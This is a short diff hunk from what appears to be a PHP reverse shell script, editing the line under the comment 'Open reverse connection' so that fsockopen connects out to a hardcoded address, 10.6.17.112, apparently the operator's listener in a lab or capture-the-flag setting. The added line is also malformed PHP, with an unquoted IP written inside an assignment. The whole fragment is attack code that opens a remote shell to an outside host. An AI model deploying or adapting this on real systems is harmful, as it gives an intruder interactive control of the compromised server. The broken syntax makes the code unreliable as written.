@@ -97,7 +97,7 @@ umask(0);
 //
 
 // Open reverse connection
-$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+$sock = fsockopen($ip=10.6.17.112, $port, $errno, $errstr, 30);
 if (!$sock) {
 	printit("$errstr ($errno)");
 	exit(1);
